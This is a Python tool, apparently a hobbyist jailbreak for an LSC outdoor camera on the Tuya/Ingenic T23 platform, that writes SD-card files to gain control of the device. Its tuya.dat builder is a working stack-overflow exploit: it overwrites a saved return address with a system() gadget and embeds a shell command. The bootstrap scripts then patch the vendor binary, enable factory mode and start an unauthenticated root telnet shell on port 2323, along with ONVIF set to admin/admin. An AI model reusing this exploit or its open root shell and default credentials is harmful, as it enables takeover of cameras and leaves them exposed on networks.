#!/usr/bin/env python3
import argparse
import shutil
import stat
import struct
from pathlib import Path


SYSTEM_SP20_GADGET = 0x0043A258
COMMAND_OFFSET_FROM_FIELD = 0x68
SAVED_RA_OFFSET_FROM_FIELD = 0x44
BOOTSTRAP_COMMAND = b"sh /tmp/mnt/sdcard/factory/firstboot.sh"


FIRSTBOOT = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOGDIR="$SD/logs"
LOG="$LOGDIR/firstboot.log"
PATCHER="$SD/custom/bin/patch_stone_main"
DST="$SD/factory/stone-main.bin"
TMP="$DST.tmp"
STONE_LOW_POWER=__STONE_LOW_POWER__

mkdir -p "$LOGDIR" "$SD/factory" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null

log() {
    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
}

fail() {
    log "FAILED: $*"
    echo firstboot-failed > /dev/console
    exit 1
}

find_stone_exe() {
    for exe in /proc/[0-9]*/exe; do
        [ -r "$exe" ] || continue
        patch_stone --check "$exe" >/dev/null 2>&1 && {
            echo "$exe"
            return 0
        }
    done
    return 1
}

patch_stone() {
    if [ "$STONE_LOW_POWER" = "1" ]; then
        "$PATCHER" --keep-low-power "$@"
    else
        "$PATCHER" "$@"
    fi
}

echo firstboot-start > /dev/console
log "start"

[ -x "$PATCHER" ] || fail "missing patcher: $PATCHER"
log "stone low power=$STONE_LOW_POWER"

src="$(find_stone_exe)" || fail "could not find running Tuya executable via /proc"
log "copying Tuya executable from $src"
rm -f "$TMP"
cp "$src" "$TMP" 2>> "$LOG" || fail "copy failed from $src"
patch_stone "$TMP" >> "$LOG" 2>&1 || fail "patch failed"
chmod 755 "$TMP" 2>> "$LOG" || true
mv -f "$TMP" "$DST" 2>> "$LOG" || fail "move failed"
sync
log "wrote patched $DST"

touch /config/fmode 2>> "$LOG" || fail "could not set /config/fmode"
sync
log "set /config/fmode; rebooting into factory bootstrap"
echo firstboot-reboot > /dev/console
reboot
"""


T23_ENTRYPOINT = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOGDIR="$SD/logs"
LOG="$LOGDIR/t23-entrypoint.log"
PATCHER="$SD/custom/bin/patch_stone_main"
STONE_LOW_POWER=__STONE_LOW_POWER__

mkdir -p "$LOGDIR" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null

log() {
    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
}

STONE_MAIN=/tmp/mnt/sdcard/factory/stone-main.bin
TELNET_PORT=2323
ONVIF_PORT=8899
TUYA_HUM_ON_OFF=0
TUYA_PIR_ON_OFF=1
TUYA_PIR_SENS=1
TUYA_RECORD_TIME=2
TUYA_FLIP_ONOFF=0
TUYA_WATERMARK_ONOFF=0
AIC_FILTER_SECONDS=90
LOW_POWER_MOTION_HOLD_SECONDS=30

echo t23-entrypoint-start > /dev/console
log "start"
log "stone low power=$STONE_LOW_POWER"
for run_log in stone-main.log telnetd.log aic_filter.log stream_relay.log onvif_httpd.log wsd_simple_server.log onvif_simple_server.log onvif_notify_server.log video_motion.log pir_motion.log; do
    : > "$LOGDIR/$run_log" 2>/dev/null || true
done
log "reset per-run logs"

if [ -f "$SD/tuya.dat" ]; then
    mv -f "$SD/tuya.dat" "$SD/tuya.dat.used" 2>> "$LOG" || rm -f "$SD/tuya.dat" 2>> "$LOG" || true
    log "consumed tuya.dat trigger"
else
    log "tuya.dat trigger already consumed"
fi

touch /config/fmode 2>> "$LOG" || true
sync
log "asserted /config/fmode"

start_telnetd() {
    mkdir -p /dev/pts 2>> "$LOGDIR/telnetd.log" || true
    mount | grep 'on /dev/pts ' >/dev/null 2>&1 || mount -t devpts devpts /dev/pts 2>> "$LOGDIR/telnetd.log" || true
    log "starting telnetd port=$TELNET_PORT"
    echo "telnetd-start-$TELNET_PORT" > /dev/console
    /sbin/telnetd -p "$TELNET_PORT" -l /bin/sh >> "$LOGDIR/telnetd.log" 2>&1 &
    log "started telnetd pid=$!"
}

start_aic_forward() {
    (
        helper="$SD/custom/bin/aic_filter"
        if [ ! -x "$helper" ]; then
            log "missing AIC filter helper: $helper"
            exit 0
        fi

        i=0
        while [ "$i" -lt "$AIC_FILTER_SECONDS" ]; do
            {
                echo "===== aic-filter round $i $(date +%Y-%m-%dT%H:%M:%S) ====="
                "$helper"
            } >> "$LOGDIR/aic_filter.log" 2>&1 || true
            i=$((i + 1))
            sleep 1
        done
        log "finished AIC TCP forward setup"
    ) &
    log "started AIC TCP forward pid=$!"
}

start_stream_relay() {
    helper="$SD/custom/bin/stone_dump_relay"
    if [ ! -x "$helper" ]; then
        log "missing stream relay helper: $helper"
        return
    fi

    if [ "$STONE_LOW_POWER" = "1" ]; then
        motion_bytes=0
    else
        motion_bytes=1
    fi

    log "starting stream relay byte_motion=$motion_bytes"
    echo stream-relay-start > /dev/console
    STONE_MOTION_BYTES="$motion_bytes" "$helper" >> "$LOGDIR/stream_relay.log" 2>&1 &
    log "started stream relay pid=$!"
}

start_onvif() {
    httpd="$SD/custom/bin/onvif_cgi_httpd"
    wsd="$SD/custom/bin/wsd_simple_server"
    notify="$SD/custom/bin/onvif_notify_server"
    onvif_root="$SD/custom/onvif"
    notify_dir="/tmp/onvif_notify_server"

    if [ ! -x "$httpd" ]; then
        log "missing ONVIF HTTP helper: $httpd"
        return
    fi
    if [ ! -x "$SD/custom/bin/onvif_simple_server" ]; then
        log "missing ONVIF CGI helper: $SD/custom/bin/onvif_simple_server"
        return
    fi
    if [ ! -f "$onvif_root/onvif_simple_server.conf" ]; then
        log "missing ONVIF config: $onvif_root/onvif_simple_server.conf"
        return
    fi

    mkdir -p "$notify_dir" 2>> "$LOGDIR/onvif_notify_server.log" || true
    rm -f "$notify_dir/motion_alarm" 2>> "$LOGDIR/onvif_notify_server.log" || true
    if [ -x "$notify" ] && [ -d "$onvif_root/notify_files" ]; then
        log "starting ONVIF notify server"
        "$notify" -c "$onvif_root/onvif_simple_server.conf" \
            -t "$onvif_root/notify_files" -p /tmp/onvif_notify_server.pid -f \
            >> "$LOGDIR/onvif_notify_server.log" 2>&1 &
        log "started ONVIF notify server pid=$!"
    else
        log "missing ONVIF notify helper or templates"
    fi

    log "starting ONVIF HTTP port=$ONVIF_PORT"
    echo onvif-http-start > /dev/console
    "$httpd" >> "$LOGDIR/onvif_httpd.log" 2>&1 &
    log "started ONVIF HTTP pid=$!"

    if [ -x "$wsd" ] && [ -d "$onvif_root/wsd_files" ]; then
        (
            i=0
            while [ "$i" -lt 45 ]; do
                if ps | grep wsd_simple_server | grep -v grep >/dev/null 2>&1; then
                    log "ONVIF WS-Discovery already running"
                    exit 0
                fi

                log "starting ONVIF WS-Discovery attempt=$i"
                "$wsd" -i wlan0 -x "http://%s:$ONVIF_PORT/onvif/device_service" \
                    -m "LSC%20Outdoor%20Camera" -n "LSC" \
                    -p /tmp/wsd_simple_server.pid -t "$onvif_root/wsd_files" -f \
                    >> "$LOGDIR/wsd_simple_server.log" 2>&1 &
                pid=$!
                sleep 3
                if kill -0 "$pid" 2>/dev/null; then
                    log "started ONVIF WS-Discovery pid=$pid attempt=$i"
                    exit 0
                fi

                log "ONVIF WS-Discovery exited attempt=$i"
                i=$((i + 1))
                sleep 2
            done
            log "ONVIF WS-Discovery failed after retries"
        ) &
        log "started ONVIF WS-Discovery retry pid=$!"
    else
        log "missing ONVIF WS-Discovery helper or templates"
    fi
}

set_tuya_config() {
    key="$1"
    value="$2"
    path="/config/tuya/$key"
    current="$(cat "$path" 2>/dev/null || true)"
    if [ "$current" = "$value" ]; then
        return
    fi
    printf "%s\\n" "$value" > "$path" 2>> "$LOG" && log "set $key=$value"
}

configure_tuya_motion() {
    mkdir -p /config/tuya 2>> "$LOG" || true
    set_tuya_config tuya_hum_on_off "$TUYA_HUM_ON_OFF"
    set_tuya_config tuya_pir_on_off "$TUYA_PIR_ON_OFF"
    set_tuya_config tuya_pir_sens "$TUYA_PIR_SENS"
    set_tuya_config tuya_record_time "$TUYA_RECORD_TIME"
    set_tuya_config tuya_flip_onoff "$TUYA_FLIP_ONOFF"
    set_tuya_config tuya_watermark_onoff "$TUYA_WATERMARK_ONOFF"
    sync
}

start_pir_motion_watcher() {
    if [ "$STONE_LOW_POWER" != "1" ]; then
        log "PIR log motion watcher disabled"
        return
    fi

    (
        notify_dir="/tmp/onvif_notify_server"
        motion_file="$notify_dir/motion_alarm"
        src="$LOGDIR/stone-main.log"
        out="$LOGDIR/pir_motion.log"
        seen=0
        motion_until=0

        mkdir -p "$notify_dir" >/dev/null 2>&1 || true
        echo "[$(date +%Y-%m-%dT%H:%M:%S)] watcher start hold=$LOW_POWER_MOTION_HOLD_SECONDS" >> "$out"
        while true; do
            now="$(date +%s 2>/dev/null || echo 0)"
            if [ "$motion_until" -gt 0 ] && [ "$now" -ge "$motion_until" ]; then
                rm -f "$motion_file" 2>/dev/null || true
                motion_until=0
                echo "[$(date +%Y-%m-%dT%H:%M:%S)] motion-off" >> "$out"
            fi

            if [ -f "$src" ]; then
                n=0
                while IFS= read -r line; do
                    n=$((n + 1))
                    [ "$n" -le "$seen" ] && continue
                    case "$line" in
                        *">pir evt<"*|*"pir:1("*)
                            ;;
                        *"event="*)
                            event="${line#*event=}"
                            event="${event%%[!0-9]*}"
                            [ -n "$event" ] && [ "$((event & 2))" -ne 0 ] || continue
                            ;;
                        *)
                            continue
                            ;;
                    esac

                    now="$(date +%s 2>/dev/null || echo 0)"
                    if [ "$motion_until" -le "$now" ] || [ ! -f "$motion_file" ]; then
                        : > "$motion_file" 2>/dev/null || true
                        echo "[$(date +%Y-%m-%dT%H:%M:%S)] motion-on $line" >> "$out"
                    fi
                    motion_until=$((now + LOW_POWER_MOTION_HOLD_SECONDS))
                done < "$src"
                if [ "$n" -lt "$seen" ]; then
                    seen=0
                else
                    seen="$n"
                fi
            fi
            sleep 1
        done
    ) &
    log "started PIR log motion watcher pid=$!"
}

start_stone_main() {
    if [ -x "$STONE_MAIN" ]; then
        if [ -x "$PATCHER" ]; then
            if [ "$STONE_LOW_POWER" = "1" ]; then
                "$PATCHER" --keep-low-power "$STONE_MAIN" >> "$LOG" 2>&1 || log "patch failed for $STONE_MAIN"
            else
                "$PATCHER" "$STONE_MAIN" >> "$LOG" 2>&1 || log "patch failed for $STONE_MAIN"
            fi
        fi
        "$STONE_MAIN" >> "$LOGDIR/stone-main.log" 2>&1 &
        log "started Tuya stone main pid=$!"
    else
        log "missing executable STONE_MAIN=$STONE_MAIN"
        echo missing-stone-main > /dev/console
    fi
}

configure_tuya_motion
start_telnetd
start_stone_main
sleep 2
start_stream_relay
start_onvif
start_pir_motion_watcher
start_aic_forward

wait
"""


FACTORY_MAIN = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOG="$SD/factory/main.log"
ENTRYPOINT="$SD/custom/scripts/entrypoint_t23.sh"

mkdir -p "$SD/factory" "$SD/logs" "$SD/custom/scripts" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null
echo factory-main-bootstrap > /dev/console
echo factory-main-bootstrap >> "$LOG"

if [ -f "$ENTRYPOINT" ]; then
    chmod +x "$ENTRYPOINT" 2>/dev/null || true
    exec /bin/sh "$ENTRYPOINT"
fi

echo "missing $ENTRYPOINT" >> "$LOG"
echo missing-entrypoint-t23 > /dev/console
while true; do
    sleep 3600
done
"""


ONVIF_CONFIG = """model=LSC Outdoor Camera
manufacturer=LSC
firmware_ver=6.2712.35
hardware_id=Ingenic T23
serial_num=LSC-T23
ifs=wlan0
port=8899
scope=onvif://www.onvif.org/Profile/Streaming
scope=onvif://www.onvif.org/Profile/T
scope=onvif://www.onvif.org/hardware/LSC-T23
scope=onvif://www.onvif.org/name/LSC%20Outdoor%20Camera
user=admin
password=admin
adv_enable_media2=0
adv_fault_if_unknown=0
adv_fault_if_set=0
adv_synology_nvr=0
name=Profile_0
width=1920
height=1080
url=rtsp://%s:8554/main_ch
snapurl=http://%s:8899/snapshot.jpg
type=H264
audio_encoder=NONE
audio_decoder=NONE
ptz=0
events=3
topic=tns1:VideoSource/MotionAlarm
source_name=Source
source_type=tt:ReferenceToken
source_value=VideoSourceToken
input_file=/tmp/onvif_notify_server/motion_alarm
"""


def build_tuya_dat(command: bytes) -> bytes:
    if b"," in command:
        raise ValueError("command must not contain comma bytes")
    field = bytearray(b"A" * COMMAND_OFFSET_FROM_FIELD)
    struct.pack_into("<I", field, SAVED_RA_OFFSET_FROM_FIELD, SYSTEM_SP20_GADGET)
    field.extend(command + b"\0")
    return bytes(field) + b",B,C,D,\n"


def chmod_exec(path: Path) -> None:
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def copy_aic_filter(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "aic_filter"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "aic_filter"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_stream_relay(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "stone_dump_relay"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "stone_dump_relay"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_patch_helper(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "patch_stone_main"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "patch_stone_main"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_onvif_files(mount: Path) -> None:
    root = Path(__file__).resolve().parents[1]
    bin_dir = root / "build" / "mipsel" / "bin"
    onvif_src = root / "build" / "third_party" / "onvif_simple_server"
    bin_names = ("onvif_cgi_httpd", "onvif_simple_server", "onvif_notify_server", "wsd_simple_server")
    asset_dirs = (
        "device_service_files",
        "deviceio_service_files",
        "events_service_files",
        "generic_files",
        "media2_service_files",
        "media_service_files",
        "notify_files",
        "ptz_service_files",
        "wsd_files",
    )

    for name in bin_names:
        src = bin_dir / name
        if not src.is_file():
            raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
        dst = mount / "custom" / "bin" / name
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dst)
        chmod_exec(dst)

    if not onvif_src.is_dir():
        raise SystemExit(f"missing {onvif_src}; run ./tools/compile.sh first")

    dst_root = mount / "custom" / "onvif"
    dst_root.mkdir(parents=True, exist_ok=True)
    (dst_root / "onvif_simple_server.conf").write_text(ONVIF_CONFIG, encoding="ascii")

    for name in asset_dirs:
        src = onvif_src / name
        if not src.is_dir():
            raise SystemExit(f"missing ONVIF asset directory {src}")
        shutil.copytree(src, dst_root / name, dirs_exist_ok=True)

    for xml in (dst_root / "device_service_files").glob("*.xml"):
        data = xml.read_text(encoding="ascii")
        data = data.replace('UsernameToken="false"', 'UsernameToken="true"')
        data = data.replace("MaxUsers=\"0\"", "MaxUsers=\"1\"")
        data = data.replace("MaxUserNameLength=\"0\"", "MaxUserNameLength=\"32\"")
        data = data.replace("MaxPasswordLength=\"0\"", "MaxPasswordLength=\"64\"")
        xml.write_text(data, encoding="ascii")

    notify_xml = dst_root / "notify_files" / "Notify.xml"
    data = notify_xml.read_text(encoding="ascii")
    if 'xmlns:tns1="http://www.onvif.org/ver10/topics"' not in data:
        data = data.replace(
            'xmlns:tt="http://www.onvif.org/ver10/schema">',
            'xmlns:tt="http://www.onvif.org/ver10/schema"\n'
            '                   xmlns:tns1="http://www.onvif.org/ver10/topics">',
        )
        notify_xml.write_text(data, encoding="ascii")


def script_with_options(script: str, *, stone_low_power: bool) -> str:
    return script.replace("__STONE_LOW_POWER__", "1" if stone_low_power else "0")


def write_mount(mount: Path, payload: bytes, *, stone_low_power: bool) -> None:
    if not mount.is_dir():
        raise SystemExit(f"mountpoint is not a directory: {mount}")

    (mount / "factory").mkdir(parents=True, exist_ok=True)
    (mount / "custom" / "scripts").mkdir(parents=True, exist_ok=True)
    (mount / "logs").mkdir(parents=True, exist_ok=True)

    (mount / "tuya.dat").write_bytes(payload)

    factory_main = mount / "factory" / "main"
    factory_main.write_text(FACTORY_MAIN, encoding="ascii")
    chmod_exec(factory_main)

    firstboot = mount / "factory" / "firstboot.sh"
    firstboot.write_text(script_with_options(FIRSTBOOT, stone_low_power=stone_low_power), encoding="ascii")
    chmod_exec(firstboot)

    entrypoint = mount / "custom" / "scripts" / "entrypoint_t23.sh"
    entrypoint.write_text(script_with_options(T23_ENTRYPOINT, stone_low_power=stone_low_power), encoding="ascii")
    chmod_exec(entrypoint)

    copy_aic_filter(mount)
    copy_stream_relay(mount)
    copy_patch_helper(mount)
    copy_onvif_files(mount)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Write the minimal T23/AIC SD bootstrap files and tuya.dat overflow kicker."
    )
    parser.set_defaults(stone_low_power=True)
    power = parser.add_mutually_exclusive_group()
    power.add_argument("--stone-low-power", dest="stone_low_power", action="store_true",
                       help="keep stone-main's stock low-power branch enabled (default)")
    power.add_argument("--no-low-power", dest="stone_low_power", action="store_false",
                       help="patch stone-main to keep Linux awake and use RTSP byte-motion fallback")
    parser.add_argument("mountpoint", nargs="?", help="SD card mountpoint to write")
    args = parser.parse_args()

    payload = build_tuya_dat(BOOTSTRAP_COMMAND)

    if not args.mountpoint:
        parser.error("provide a mountpoint")

    mount = Path(args.mountpoint)
    write_mount(mount, payload, stone_low_power=args.stone_low_power)

    print(f"wrote {mount / 'tuya.dat'} ({len(payload)} bytes)")
    print(f"wrote {mount / 'factory' / 'main'}")
    print(f"wrote {mount / 'factory' / 'firstboot.sh'}")
    print(f"wrote {mount / 'custom' / 'scripts' / 'entrypoint_t23.sh'}")
    print(f"stone low power: {'enabled' if args.stone_low_power else 'disabled'}")
    print("telnet: telnet <camera-ip> 2323")
    print("RTSP main stream: rtsp://<camera-ip>:8554/main_ch")
    print("ONVIF device service: http://<camera-ip>:8899/onvif/device_service")
    print("raw H264 main stream: nc <camera-ip> 8555 > stream.h264")
    print(f"system() command at overflow offset 0x{COMMAND_OFFSET_FROM_FIELD:x}: {BOOTSTRAP_COMMAND.decode('ascii')}")
    print(f"saved RA overwrite at offset 0x{SAVED_RA_OFFSET_FROM_FIELD:x}: 0x{SYSTEM_SP20_GADGET:08x}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
